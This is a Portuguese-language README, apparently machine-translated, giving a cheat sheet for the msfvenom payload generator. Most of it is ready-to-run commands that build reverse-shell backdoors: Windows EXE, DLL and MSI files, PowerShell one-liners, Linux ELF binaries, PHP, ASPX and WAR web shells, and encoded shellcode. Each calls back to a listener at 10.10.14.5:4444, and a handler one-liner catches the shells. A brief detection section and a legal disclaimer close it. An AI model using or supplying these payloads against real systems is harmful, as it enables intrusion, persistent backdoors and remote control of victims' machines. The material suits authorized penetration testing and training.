<!-- language-home-navigation -->
[🏠 Página Principal Portuguesa](../../README.pt.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇪🇸 Español](README.es.md) • [🇫🇷 Français](README.fr.md)

[🇮🇹 Italiano](README.it.md) • [🇷🇺 Русский](README.ru.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇸🇦 العربية](README.ar.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)

---


# 💣 Msfvenom - Folha de dicas completa

[🇹🇷 Türkçe Sürüm](traduções/README.tr.md)
```
  ███╗   ███╗███████╗███████╗██╗   ██╗███████╗███╗   ██╗ ██████╗ ███╗   ███╗
  ████╗ ████║██╔════╝██╔════╝██║   ██║██╔════╝████╗  ██║██╔═══██╗████╗ ████║
  ██╔████╔██║███████╗█████╗  ██║   ██║█████╗  ██╔██╗ ██║██║   ██║██╔████╔██║
  ██║╚██╔╝██║╚════██║██╔══╝  ╚██╗ ██╔╝██╔══╝  ██║╚██╗██║██║   ██║██║╚██╔╝██║
  ██║ ╚═╝ ██║███████║██║      ╚████╔╝ ███████╗██║ ╚████║╚██████╔╝██║ ╚═╝ ██║
  ╚═╝     ╚═╝╚══════╝╚═╝       ╚═══╝  ╚══════╝╚═╝  ╚═══╝ ╚═════╝ ╚═╝     ╚═╝
         Metasploit Standalone Payload Generator & Shellcode Encoder
```
<p alinhar="centro">
  <img src="https://img.shields.io/badge/Msfvenom-Payload_Generator-blue?style=for-the-badge" alt="Msfvenom">
  <img src="https://img.shields.io/badge/Framework-Metasploit-red?style=for-the-badge" alt="Metasploit">
  <img src="https://img.shields.io/badge/Category-Exploit_Payloads-green?style=for-the-badge" alt="Cargas úteis">
  <img src="https://img.shields.io/badge/Output-Binaries_%7C_Shellcode_%7C_Scripts-purple?style=for-the-badge" alt="Formatos">
</p>

<p alinhar="centro">
  <b>💣 Folha de dicas mestre para gerar payloads independentes, shellcode e backdoors em plataformas Windows, Linux, macOS, Android e Web</b>
</p>

---

## 📋 Índice

- [Visão geral e arquitetura de carga útil](#-overview--payload-architecture)
  - [Cargas preparadas vs. sem fase](#cargas preparadas vs. sem fase)
- [Sinalizadores e opções essenciais](#-essential-flags--options)
- [Cargas úteis do Windows (EXE, DLL, MSI, PowerShell)](#-windows-payloads-exe-dll-msi-powershell)
- [Cargas Linux e Unix (ELF, Python, Bash)](#-linux--unix-payloads-elf-python-bash)
- [Cargas Web e Web Shell (PHP, ASP, ASPX, JSP, WAR)](#-web--web-shell-payloads-php-asp-aspx-jsp-war)
- [Geração de Shellcode para Desenvolvimento de Exploit (C, Raw, Python)](#-shellcode-generation-for-exploit-development-c-raw-python)
  - [Remoção de personagens ruins (`-b`)](#remoção de personagens ruins--b)
  - [Codificadores e múltiplas iterações (`-e`, `-i`)](#encoders--multiple-iterations--e--i)
- [Configuração rápida do Metasploit Multi-Handler](#-metasploit-multi-handler-quick-setup)
- [Tabela de referência rápida](#-tabela de referência rápida)
- [Considerações defensivas e detecção](#-considerações defensivas--detecção)
- [Isenção de responsabilidade legal](#-isenção de responsabilidade legal)

---

## 🎯 Visão geral e arquitetura de carga útil

Combinando os utilitários clássicos `msfpayload` e `msfencode`, **msfvenom** gera executáveis ​​binários, scripts e shellcode bruto para exploração e testes de penetração.

### Cargas encenadas versus sem fase
- **Encenado (por exemplo, `windows/x64/meterpreter/reverse_tcp`):**
  Usa barras entre os componentes. Um pequeno stub (estágio 0) se conecta de volta ao ouvinte e busca a DLL reflexiva completa (estágio 1) na memória. Ideal para explorações com limites rígidos de comprimento de buffer.
- **Sem palco (por exemplo, `windows/x64/meterpreter_reverse_tcp`):**
  Usa um sublinhado (`_`). Toda a carga útil do Meterpreter é independente dentro do executável ou shellcode. Funciona de forma confiável sem depender de handshakes de rede em vários estágios, tornando-o ideal para executores de linha de comando e persistência evasiva.

---

## ⚙️ Sinalizadores e opções essenciais
```bash
msfvenom -p <PAYLOAD> LHOST=<IP> LPORT=<PORT> -f <FORMAT> -o <OUTPUT_FILE>
```
| Bandeira | Descrição |
|------|-------------|
| `-p, --payload` | Especifica a carga útil a ser usada (`--list payloads` para visualizar tudo). |
| `-f, --format` | Formato de saída (exe, elf, raw, c, python, asp, aspx, war, php). |
| `-e, --encoder` | Codificador Shellcode para eliminar caracteres inválidos (`--list encoders`). |
| `-i, --iterations` | Número de passagens de codificação. |
| `-b, --bad-chars` | Caracteres a serem evitados no shellcode (por exemplo, `\x00\x0a\x0d`). |
| `-x, --template` | Modelo executável para injetar carga útil. |
| `-k, --keep` | Preserva a execução normal do modelo em um novo thread. |
| `-o, --out` | Caminho do arquivo de destino de saída. |

---

## 🪟 Cargas úteis do Windows (EXE, DLL, MSI, PowerShell)

### Executável de shell reverso do Windows x64 (sem estágio)
```bash
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f exe -o shell.exe
```
### Executável TCP reverso preparado para Windows x64
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f exe -o staged.exe
```
### Carga útil de injeção de DLL do Windows
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f dll -o payload.dll
```
### Windows MSI Installer (escalonamento de privilégios via AlwaysInstallElevated)
```bash
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f msi -o install.msi
```
### Comando PowerShell codificado em Base64
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f psh-cmd -o run.bat
```
---

## 🐧 Cargas Linux e Unix (ELF, Python, Bash)

### Binário Linux x64 ELF (sem estágio)
```bash
msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f elf -o shell.elf
chmod +x shell.elf
```
### Padrão Linux `/bin/sh` TCP reverso (sem Meterpreter)
```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f elf -o reverse.elf
```
### Script de shell reverso Python autônomo
```bash
msfvenom -p cmd/unix/reverse_python LHOST=10.10.14.5 LPORT=4444 -f raw -o shell.py
```
### Sequência de comando pura do Bash
```bash
msfvenom -p cmd/unix/reverse_bash LHOST=10.10.14.5 LPORT=4444 -f raw -o shell.sh
```
---

## 🌐 Cargas Web e Web Shell (PHP, ASP, ASPX, JSP, WAR)

### PHP Reverse Meterpreter Shell
```bash
msfvenom -p php/meterpreter_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f raw -o shell.php
```
### ASP clássico e ASPX (servidores IIS)
```bash
# Classic ASP
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f asp -o shell.asp

# Modern ASPX (.NET)
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f aspx -o shell.aspx
```
### Pacote Java WAR (arquivo da Web Apache Tomcat)
```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f war -o webshell.war
```
---

## 🔬 Geração de Shellcode para Desenvolvimento de Exploit (C, Raw, Python)

### Removendo personagens ruins (`-b`)
Bytes nulos (`\x00`), retornos de carro (`\r` = `\x0d`) e novas linhas (`\n` = `\x0a`) interrompem explorações de corrupção de memória baseadas em string (por exemplo, estouros de pilha):
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 \
  -b '\x00\x0a\x0d' -f c -o shellcode.c
```
### Codificadores e múltiplas iterações (`-e`, `-i`)
```bash
# Polymorphic XOR additive feedback encoder
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 \
  -e x86/shikata_ga_nai -i 5 -b '\x00' -f raw -o payload.bin
```
---

## 🎧 Configuração rápida do multi-manipulador Metasploit

Sempre capture cargas úteis usando o `multi/handler` do Metasploit:
```bash
# One-liner handler startup
msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter_reverse_tcp; set LHOST 0.0.0.0; set LPORT 4444; run"
```
---

## ⚡ Tabela de referência rápida

| Plataforma Alvo | Comando |
|-----------------|---------|
| **EXE do Windows x64** | `msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=<IP> LPORT=4444 -f exe -o run.exe` |
| **Linux x64 ELF** | `msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=<IP> LPORT=4444 -f elf -o run.elf` |
| **PHP WebShell** | `msfvenom -p php/meterpreter_reverse_tcp LHOST=<IP> LPORT=4444 -f raw -o shell.php` |
| **ASPX (.NET IIS)** | `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=4444 -f aspx -o shell.aspx` |
| **Guerra do Tomcat** | `msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=4444 -f war -o shell.war` |
| **Shellcode bruto (C)**| `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=4444 -b '\x00' -f c` |
| **PowerShell One-Liner**| `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=4444 -f psh-cmd` |

---

## 🛡️ Considerações defensivas e detecção

1. **Detecção de assinatura estática:** Os modelos e codificadores Msfvenom padrão (`shikata_ga_nai`) possuem assinaturas estáticas conhecidas, identificadas por praticamente todos os mecanismos antivírus modernos.
2. **Monitoramento de EDR comportamental:** Agentes de EDR sinalizam a geração anormal de processos (por exemplo, `cmd.exe` ou `powershell.exe` gerados em `w3wp.exe` ou `tomcat8.exe`).

---

## ⚠️ Isenção de responsabilidade legal

> [!CUIDADO]
> Msfvenom gera backdoors e cargas ofensivas funcionais. Deve ser utilizado estritamente durante testes de penetração autorizados e em ambientes isolados de pesquisa laboratorial. A geração ou execução não autorizada em computadores de terceiros é ilegal.